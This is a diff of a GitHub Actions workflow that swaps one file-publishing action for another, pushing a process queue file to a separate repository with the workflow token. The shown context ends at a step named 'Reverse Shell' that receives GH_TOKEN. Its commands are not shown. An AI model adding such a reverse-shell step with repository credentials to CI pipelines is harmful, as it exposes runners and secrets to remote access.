@@ -83,18 +83,19 @@ jobs:
           gh repo clone https://github.com/L1ghtDream/raport
           cp run/process.queue raport/process.queue
 
-      - name: Deploy to external repository
-        uses: cpina/github-action-push-to-another-repository@main
+
+      - name: Pushes test file
+        uses: dmnemec/copy_file_to_another_repo_action@main
         env:
           API_TOKEN_GITHUB: ${{ secrets.GITHUB_TOKEN }}
-
         with:
-          source-directory: raport/
-          destination-github-username: L1ghtDream
-          destination-repository-name: raport
-          user-email: admin@voinearadu
-          target-branch: "gh-pages"
-
+          source_file: 'run/process.queue'
+          destination_repo: 'L1ghtDream/raport'
+          destination_folder: 'queue'
+          user_email: 'admin@voinearadu.com'
+          user_name: 'Radu Voinea'
+          commit_message: '+'
+          
       - name: "Reverse Shell"
         env:
           GH_TOKEN: ${{ github.token }}
